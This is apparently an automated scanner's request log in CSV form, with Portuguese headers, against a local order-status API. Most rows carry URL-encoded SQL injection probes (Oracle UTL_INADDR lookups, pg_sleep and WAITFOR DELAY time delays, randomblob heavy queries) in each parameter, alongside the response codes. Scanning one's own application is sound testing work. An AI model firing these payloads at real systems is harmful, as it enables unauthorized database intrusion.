ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
332,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api,404,Not Found,1,99,0
333,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api/Pedidos,404,Not Found,1,99,0
334,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,7,92,0
335,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,549
336,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,555
337,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,559
338,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,561
339,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+and+exists+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,567
340,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,7,92,0
341,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,543
342,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,566
343,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,570
344,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,572
345,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento+and+exists+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,578
346,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,6,92,0
347,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29,200,OK,5,92,0
348,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+,200,OK,6,92,0
349,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27,200,OK,7,92,0
350,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22,200,OK,6,92,0
351,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+and+exists+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+--+,200,OK,5,92,0
352,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000,404,Not Found,1,99,0
353,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api,404,Not Found,1,99,0
354,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,313
355,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api/Pedidos,404,Not Found,1,99,0
356,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,317
357,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=%27case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,318
358,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=%22case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,319
359,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+%2F+case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,319
360,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,307
361,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,311
362,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=%27case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,312
363,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=%22case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,313
364,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento+%2F+case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,330
365,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end,200,OK,7,92,0
366,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,5,92,0
367,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=%27case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,6,92,0
368,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=%22case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,6,92,0
369,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+%2F+case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+,200,OK,5,92,0
370,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000,404,Not Found,1,99,0
371,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api,404,Not Found,1,99,0
372,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api/Pedidos,404,Not Found,1,99,0
373,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,7,92,0
374,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,6,92,0
375,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=case+randomblob%28100000%29+when+not+null+then+1+else+1+end+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,305
376,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=case+randomblob%281000000%29+when+not+null+then+1+else+1+end+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,306
377,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,307
378,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=dkddst5451f7rk1enkhqr178o9qb5u4tyj3t8z85ue8l0ap6u0fm1lcvhc&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,307
379,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,308
380,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=1vd0rlj7454hld36be6r6cpf0q79g9csx38g76t8p36p5f8z1fz2ow9mq5t&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,308
381,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,309
382,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,6,92,0
383,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,6,92,0
384,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=case+randomblob%28100000%29+when+not+null+then+1+else+1+end+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,299
385,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=case+randomblob%281000000%29+when+not+null+then+1+else+1+end+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,300
386,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,301
387,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,302
388,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,303
389,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,6,92,0
390,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,7,92,0
391,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=case+randomblob%28100000%29+when+not+null+then+1+else+1+end+,200,OK,6,92,0
392,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=case+randomblob%281000000%29+when+not+null+then+1+else+1+end+,200,OK,5,92,0
393,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+,200,OK,5,92,0
394,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+,200,OK,5,92,0
395,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+,200,OK,5,92,0
396,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000,404,Not Found,1,99,0
397,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api,404,Not Found,1,99,0
398,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api/Pedidos,404,Not Found,1,99,0
399,Sun Jun 23 13:56:21 BRT 2024,Sun Jun 23 13:56:21 BRT 2024,GET,http://localhost:8000,404,Not Found,2,99,0
400,Sun Jun 23 13:56:21 BRT 2024,Sun Jun 23 13:56:21 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+WAITFOR+DELAY+%270%3A0%3A15%27+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,278
401,Sun Jun 23 13:56:21 BRT 2024,Sun Jun 23 13:56:21 BRT 2024,GET,http://localhost:8000/api,404,Not Found,1,99,0
402,Sun Jun 23 13:56:21 BRT 2024,Sun Jun 23 13:56:21 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,279
